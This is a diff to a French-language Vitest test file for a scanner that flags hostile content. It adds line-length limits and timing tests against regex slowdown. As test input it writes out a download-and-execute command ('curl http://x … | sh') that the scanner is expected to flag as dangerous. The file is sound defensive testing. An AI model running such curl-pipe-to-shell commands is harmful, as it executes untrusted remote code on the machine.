@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { TAILLE_MAX_ANALYSE, creerScanner } from '../src/main/core/scan'
+import { LIGNE_MAX_ANALYSE, TAILLE_MAX_ANALYSE, creerScanner } from '../src/main/core/scan'
 import { getCatalogue } from '../src/shared/data'
 import golden from './fixtures/golden.json'
 
@@ -125,13 +125,32 @@ describe('contenu hostile', () => {
     expect(r.issues.map((i) => i.category)).toEqual(['taille'])
   })
 
-  it('analyse en temps borné un texte conçu pour faire ralentir les motifs', () => {
+  it('refuse une ligne démesurée (le motif « curl … | sh » y serait quadratique)', () => {
+    const r = analyser('curl |'.repeat(TAILLE_MAX_ANALYSE / 6))
+    expect(r.status).toBe('danger')
+    expect(r.issues.map((i) => i.category)).toContain('taille')
+    expect(analyser('a'.repeat(LIGNE_MAX_ANALYSE + 1)).issues.map((i) => i.category)).toEqual(['taille'])
+    expect(analyser('a'.repeat(LIGNE_MAX_ANALYSE)).status).toBe('clean')
+  })
+
+  it('un téléchargement exécuté reste vu avec 2 500 caractères entre « curl » et « | sh » (pas de contournement par remplissage)', () => {
+    expect(analyser(`curl http://x ${'a'.repeat(2500)} | sh`).status).toBe('danger')
+  })
+
+  // Le pire cas qui passe la limite de ligne : des lignes longues pleines de « curl | »
+  it('analyse en temps borné un texte conçu pour faire ralentir les motifs', { timeout: 30_000 }, () => {
+    const ligne = 'curl |'.repeat(LIGNE_MAX_ANALYSE / 6)
+    const hostiles = [
+      Array.from({ length: Math.floor(TAILLE_MAX_ANALYSE / (LIGNE_MAX_ANALYSE + 1)) }, () => ligne).join('\n'),
+      'curl '.repeat(TAILLE_MAX_ANALYSE / 5),
+      'curl x '.repeat(TAILLE_MAX_ANALYSE / 7),
+      'curl\n'.repeat(TAILLE_MAX_ANALYSE / 5),
+      ' '.repeat(TAILLE_MAX_ANALYSE)
+    ]
     const debut = performance.now()
-    analyser('curl '.repeat(TAILLE_MAX_ANALYSE / 5))
-    analyser('curl x '.repeat(TAILLE_MAX_ANALYSE / 7))
-    analyser(' '.repeat(TAILLE_MAX_ANALYSE))
-    // Mesuré à moins d'une seconde au total ; marge large pour les machines d'intégration continue lentes
-    expect(performance.now() - debut).toBeLessThan(10_000)
+    for (const t of hostiles) analyser(t)
+    // Marge large pour les machines d'intégration continue lentes (le délai par défaut de 5 s avait coupé le test sur GitHub)
+    expect(performance.now() - debut).toBeLessThan(8_000)
   })
 
   it('le plus long skill intégré reste très en dessous de la limite', () => {
